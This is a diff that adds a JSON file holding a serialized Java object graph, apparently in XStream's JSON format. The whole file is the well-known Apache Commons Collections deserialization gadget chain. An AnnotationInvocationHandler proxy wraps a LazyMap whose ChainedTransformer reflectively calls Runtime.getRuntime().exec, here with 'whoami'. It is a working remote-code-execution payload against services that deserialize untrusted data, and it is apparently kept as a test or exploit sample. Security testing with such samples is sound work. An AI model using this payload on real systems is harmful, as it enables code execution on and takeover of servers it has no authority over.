@@ -1,0 +1,90 @@
+{
+    "sun.reflect.annotation.AnnotationInvocationHandler": {
+        "@serialization": "custom",
+        "sun.reflect.annotation.AnnotationInvocationHandler": {
+            "default": {
+                "memberValues": {
+                    "@class": "dynamic-proxy",
+                    "interface": "map",
+                    "handler": {
+                        "@class": "sun.reflect.annotation.AnnotationInvocationHandler",
+                        "@serialization": "custom",
+                        "sun.reflect.annotation.AnnotationInvocationHandler": {
+                            "default": {
+                                "memberValues": {
+                                    "@class": "org.apache.commons.collections.map.LazyMap",
+                                    "@serialization": "custom",
+                                    "unserializable-parents": "",
+                                    "org.apache.commons.collections.map.LazyMap": {
+                                        "default": {
+                                            "factory": {
+                                                "@class": "org.apache.commons.collections.functors.ChainedTransformer",
+                                                "iTransformers": {
+                                                    "org.apache.commons.collections.functors.ConstantTransformer": [
+                                                        {
+                                                            "iConstant": {
+                                                                "@class": "java-class",
+                                                                "$": "java.lang.Runtime"
+                                                            }
+                                                        },
+                                                        {
+                                                            "iConstant": {
+                                                                "@class": "int",
+                                                                "$": "1"
+                                                            }
+                                                        }
+                                                    ],
+                                                    "org.apache.commons.collections.functors.InvokerTransformer": [
+                                                        {
+                                                            "iMethodName": "getMethod",
+                                                            "iParamTypes": {
+                                                                "java-class": [
+                                                                    "java.lang.String",
+                                                                    "[Ljava.lang.Class;"
+                                                                ]
+                                                            },
+                                                            "iArgs": {
+                                                                "string": "getRuntime",
+                                                                "java-class-array": ""
+                                                            }
+                                                        },
+                                                        {
+                                                            "iMethodName": "invoke",
+                                                            "iParamTypes": {
+                                                                "java-class": [
+                                                                    "java.lang.Object",
+                                                                    "[Ljava.lang.Object;"
+                                                                ]
+                                                            },
+                                                            "iArgs": {
+                                                                "null": "",
+                                                                "object-array": ""
+                                                            }
+                                                        },
+                                                        {
+                                                            "iMethodName": "exec",
+                                                            "iParamTypes": {
+                                                                "java-class": "java.lang.String"
+                                                            },
+                                                            "iArgs": {
+                                                                "@class": "string-array",
+                                                                "string": "whoami"
+                                                            }
+                                                        }
+                                                    ]
+                                                }
+                                            }
+                                        },
+                                        "map": ""
+                                    }
+                                },
+                                "type": "java.lang.Override"
+                            }
+                        }
+                    }
+                },
+                "type": "java.lang.Override"
+            }
+        }
+    }
+}
